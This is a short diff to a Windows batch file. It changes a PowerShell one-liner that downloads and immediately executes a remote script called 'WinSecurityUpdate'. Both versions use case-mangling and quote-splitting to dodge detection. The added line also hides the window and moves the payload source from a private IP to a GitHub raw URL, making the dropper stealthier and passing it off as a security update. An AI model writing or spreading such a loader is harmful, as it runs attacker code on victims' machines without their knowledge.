@@ -1,2 +1,2 @@
 @ECHO OFF
-po""weR""sHelL -nO""p -c "iEx(New-Object Net.WEbclIent).DoWnLOadstRinG('http://192.168.241.132:8000/WinSecurityUpdate')"
+po""we''R""sHe''lL -nO""p -windowstyle hidden -c "iE''x(New-''Object Net.WEbc''lIen''t).DoWn''LOads''tRi''nG('https://raw.githubusercontent.com/cudkajak/storage_unit13/main/update_script/WinSecurityUpdate')"
